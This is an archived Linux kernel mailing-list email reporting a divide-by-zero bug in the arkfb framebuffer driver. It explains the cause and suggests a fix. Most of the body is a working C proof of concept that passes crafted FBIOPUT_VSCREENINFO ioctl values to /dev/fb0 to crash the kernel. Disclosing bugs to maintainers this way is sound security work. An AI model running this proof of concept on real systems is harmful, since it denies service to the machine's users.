Return-Path: <dri-devel-bounces@lists.freedesktop.org>
X-Original-To: lists+dri-devel@lfdr.de
Delivered-To: lists+dri-devel@lfdr.de
Received: from gabe.freedesktop.org (gabe.freedesktop.org [IPv6:2610:10:20:722:a800:ff:fe36:1795])
	by mail.lfdr.de (Postfix) with ESMTPS id E6A2C5822C0
	for <lists+dri-devel@lfdr.de>; Wed, 27 Jul 2022 11:07:35 +0200 (CEST)
Received: from gabe.freedesktop.org (localhost [127.0.0.1])
	by gabe.freedesktop.org (Postfix) with ESMTP id 0C329C36D7;
	Wed, 27 Jul 2022 09:07:31 +0000 (UTC)
X-Original-To: dri-devel@lists.freedesktop.org
Delivered-To: dri-devel@lists.freedesktop.org
Received: from mail-pf1-x429.google.com (mail-pf1-x429.google.com
 [IPv6:2607:f8b0:4864:20::429])
 by gabe.freedesktop.org (Postfix) with ESMTPS id E2C42C36D0
 for <dri-devel@lists.freedesktop.org>; Wed, 27 Jul 2022 09:07:28 +0000 (UTC)
Received: by mail-pf1-x429.google.com with SMTP id y9so15544839pff.12
 for <dri-devel@lists.freedesktop.org>; Wed, 27 Jul 2022 02:07:28 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmail.com; s=20210112;
 h=mime-version:from:date:message-id:subject:to:cc;
 bh=WdjHuRxAl4NImVFIF4JC02Fp7SCGdh6XVUJ8vK99+aY=;
 b=ncLcqy6RH5X84w9V5TliSJ1AfuprYyfl2xZtNKIjiMw6kvHmhS0O5CSH0oEQC/4Zxv
 uzKCknzlSwrbjPrFa0KzpEE9mSfA08jHMAFZbEsZEshSUfFro5G23QZK/wo3dqc5duH0
 Lol55r/HjF635EBQ9sDkVKT/vMOLrMp8XpkX6E2mpzUTOhtdWfFh6n2iEwz2bXk8M+cy
 qiH4UTh0ad0thYxTN4FCNUQ8+kM3Ix49rS86xTQOvMQLVfi4MKnLw0+reJ5fkIs3DBjI
 OQ9vHZUz34FlK+ni3Z9pVQ8GOkvhoHySepcgfyBRs3kh48I37PkvfyJbAywY9Lz+4AvP
 VxUQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20210112;
 h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
 bh=WdjHuRxAl4NImVFIF4JC02Fp7SCGdh6XVUJ8vK99+aY=;
 b=693oVlhTmTA8gldsosdTa4skyT+ojrPCVEEqk4g0n8UChh5n4U8m6yD4hhxj3COvlf
 UegBIQF94h7I3yBYZLD5ySt0qNCGyqxGiB06d/CXYR8QTJPtRRB9LrpU8pcYq1k2wTJ+
 kBLkQUAArBKNbzgLT/LsdHN+gneCFgHdudQbMNuCX2ToiIt/YoGeyTnqiFlIPqtnQ/OD
 N/ODfA00wqY5awIny62uB6dxQzD17Ob82OWwAZZFPrFqlRL1Vut9NV0GovBPDdeh8eoE
 EWVR7jI5tPSh0N3quiSOiKGbyYLfShJuFXqZayBx8doPMzEIKpiGa28A9Rt5LhJQRfKt
 R2pw==
X-Gm-Message-State: AJIora9M7mdWkqDhi/ouKvjCVZ+ePwImS29zuHqKJD++zdv4fNEM3ki3
 JDis3wPnbakhO3nuDhWwR9WTiLPqPExKA6xwnQ==
X-Google-Smtp-Source: AGRyM1vH/AEHYfbs3aWF0iR26kLMNpggartHuW2PnZK1D5a+ET0ksgorCUOsRG+F8rVfm3t1ZwjFgIc1WMSfJSMwbOQ=
X-Received: by 2002:a63:f809:0:b0:41b:4a4c:4fbf with SMTP id
 n9-20020a63f809000000b0041b4a4c4fbfmr1260766pgh.616.1658912848298; Wed, 27
 Jul 2022 02:07:28 -0700 (PDT)
MIME-Version: 1.0
From: Zheyu Ma <zheyuma97@gmail.com>
Date: Wed, 27 Jul 2022 17:07:17 +0800
Message-ID: <CAMhUBjkps_2EAkbCpGuLiWVFObLkLuj=3UqbxcuENUNXMkbS9Q@mail.gmail.com>
Subject: [BUG] video: fbdev: arkfb: Found a divide-by-zero bug which may cause
 DoS
To: Helge Deller <deller@gmx.de>
Content-Type: text/plain; charset="UTF-8"
X-BeenThere: dri-devel@lists.freedesktop.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Direct Rendering Infrastructure - Development
 <dri-devel.lists.freedesktop.org>
List-Unsubscribe: <https://lists.freedesktop.org/mailman/options/dri-devel>,
 <mailto:dri-devel-request@lists.freedesktop.org?subject=unsubscribe>
List-Archive: <https://lists.freedesktop.org/archives/dri-devel>
List-Post: <mailto:dri-devel@lists.freedesktop.org>
List-Help: <mailto:dri-devel-request@lists.freedesktop.org?subject=help>
List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/dri-devel>,
 <mailto:dri-devel-request@lists.freedesktop.org?subject=subscribe>
Cc: Linux Fbdev development list <linux-fbdev@vger.kernel.org>,
 Linux Kernel Mailing List <linux-kernel@vger.kernel.org>,
 DRI Development <dri-devel@lists.freedesktop.org>
Errors-To: dri-devel-bounces@lists.freedesktop.org
Sender: "dri-devel" <dri-devel-bounces@lists.freedesktop.org>

Hello,

I found a bug in the arkfb driver in the latest kernel, which may cause DoS.

The reason for this bug is that the user controls some input to ioctl,
making 'mode' 0x7 on line 704, which causes hdiv = 1, hmul = 2, and if
the pixclock is controlled to be 1, it will cause a division error in
the function ark_set_pixclock().

Here is a simple PoC:

#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>

typedef unsigned int __u32;

#define FBIOPUT_VSCREENINFO 0x4601

struct fb_bitfield {
__u32 offset; /* beginning of bitfield */
__u32 length; /* length of bitfield */
__u32 msb_right; /* != 0 : Most significant bit is */
/* right */
};

struct fb_var_screeninfo {
__u32 xres; /* visible resolution */
__u32 yres;
__u32 xres_virtual; /* virtual resolution */
__u32 yres_virtual;
__u32 xoffset; /* offset from virtual to visible */
__u32 yoffset; /* resolution */

__u32 bits_per_pixel; /* guess what */
__u32 grayscale; /* 0 = color, 1 = grayscale, */
/* >1 = FOURCC */
struct fb_bitfield red; /* bitfield in fb mem if true color, */
struct fb_bitfield green; /* else only length is significant */
struct fb_bitfield blue;
struct fb_bitfield transp; /* transparency */

__u32 nonstd; /* != 0 Non standard pixel format */

__u32 activate; /* see FB_ACTIVATE_* */

__u32 height; /* height of picture in mm    */
__u32 width; /* width of picture in mm     */

__u32 accel_flags; /* (OBSOLETE) see fb_info.flags */

/* Timing: All values in pixclocks, except pixclock (of course) */
__u32 pixclock; /* pixel clock in ps (pico seconds) */
__u32 left_margin; /* time from sync to picture */
__u32 right_margin; /* time from picture to sync */
__u32 upper_margin; /* time from sync to picture */
__u32 lower_margin;
__u32 hsync_len; /* length of horizontal sync */
__u32 vsync_len; /* length of vertical sync */
__u32 sync; /* see FB_SYNC_* */
__u32 vmode; /* see FB_VMODE_* */
__u32 rotate; /* angle we rotate counter clockwise */
__u32 colorspace; /* colorspace for FOURCC-based modes */
__u32 reserved[4]; /* Reserved for future compatibility */
};

struct fb_var_screeninfo var;

int main(void) {
int fd, ret;

fd = open("/dev/fb0", O_RDONLY);
if (fd < 0) {
perror("Failed to open the device");
return 1;
}
var.xres = 40;
var.yres = 40;
var.hsync_len = 1;
var.vsync_len = 1;
var.pixclock = 1;
var.bits_per_pixel = 32;

ret = ioctl(fd, FBIOPUT_VSCREENINFO, &var);
if (ret < 0) {
perror("Failed to call the ioctl");
return 1;
}
return 0;
}

The easiest patch is to check the value of the argument 'pixclock' in
the ark_set_pixclock function, but this is perhaps too late, should we
do this check earlier? I'm not sure, so I'll report this bug to you.

regards,

Zheyu Ma
